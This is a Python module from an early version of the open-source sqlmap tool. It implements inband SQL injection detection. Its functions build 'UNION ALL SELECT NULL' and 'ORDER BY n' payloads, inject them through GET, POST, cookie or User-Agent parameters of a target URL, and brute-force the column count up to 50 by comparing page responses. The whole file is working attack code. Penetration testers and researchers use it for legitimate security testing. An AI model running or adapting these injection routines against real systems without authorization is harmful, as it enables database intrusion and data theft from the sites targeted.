#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



from lib.core.agent import agent
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.session import setUnion
from lib.request.connect import Connect as Request


def __forgeUserFriendlyValue(payload):
    value = ""

    if kb.injPlace == "GET":
        value = "%s?%s" % (conf.url, payload)
    elif kb.injPlace == "POST":
        value  = "URL:\t'%s'" % conf.url
        value += "\nPOST:\t'%s'\n" % payload
    elif kb.injPlace == "Cookie":
        value  = "URL:\t'%s'" % conf.url
        value += "\nCookie:\t'%s'\n" % payload
    elif kb.injPlace == "User-Agent":
        value  = "URL:\t\t'%s'" % conf.url
        value += "\nUser-Agent:\t'%s'\n" % payload

    return value


def __unionTestByNULLBruteforce(comment):
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 50 columns
    on the target database table
    """

    columns = None
    value   = None
    query   = agent.prefixQuery(" UNION ALL SELECT NULL")

    for count in range(0, 50):
        if kb.dbms == "Oracle" and query.endswith(" FROM DUAL"):
            query = query[:-len(" FROM DUAL")]

        if count:
            query += ", NULL"

        if kb.dbms == "Oracle":
            query += " FROM DUAL"

        commentedQuery = agent.postfixQuery(query, comment)
        payload        = agent.payload(newValue=commentedQuery)
        seqMatcher     = Request.queryPage(payload, getSeqMatcher=True)

        if seqMatcher >= 0.6:
            columns = count + 1
            value   = __forgeUserFriendlyValue(payload)

            break

    return value, columns


def __unionTestByOrderBy(comment):
    columns = None
    value   = None

    for count in range(1, 51):
        query        = agent.prefixQuery(" ORDER BY %d" % count)
        orderByQuery = agent.postfixQuery(query, comment)
        payload      = agent.payload(newValue=orderByQuery)
        seqMatcher   = Request.queryPage(payload, getSeqMatcher=True)

        if seqMatcher >= 0.6:
            columns = count

        elif columns:
            value = __forgeUserFriendlyValue(prevPayload)

            break

        prevPayload = payload

    return value, columns


def unionTest():
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 3*50 times
    """

    if conf.uTech == "orderby":
        technique = "ORDER BY clause bruteforcing"
    else:
        technique = "NULL bruteforcing"

    logMsg  = "testing inband sql injection on parameter "
    logMsg += "'%s' with %s technique" % (kb.injParameter, technique)
    logger.info(logMsg)

    value   = ""
    columns = None

    for comment in (queries[kb.dbms].comment, ""):
        if conf.uTech == "orderby":
            value, columns = __unionTestByOrderBy(comment)
        else:
            value, columns = __unionTestByNULLBruteforce(comment)

        if columns:
            setUnion(comment, columns)

            break

    if kb.unionCount:
        logMsg  = "the target url could be affected by an "
        logMsg += "inband sql injection vulnerability"
        logger.info(logMsg)
    else:
        warnMsg  = "the target url is not affected by an "
        warnMsg += "inband sql injection vulnerability"
        logger.warn(warnMsg)

    return value
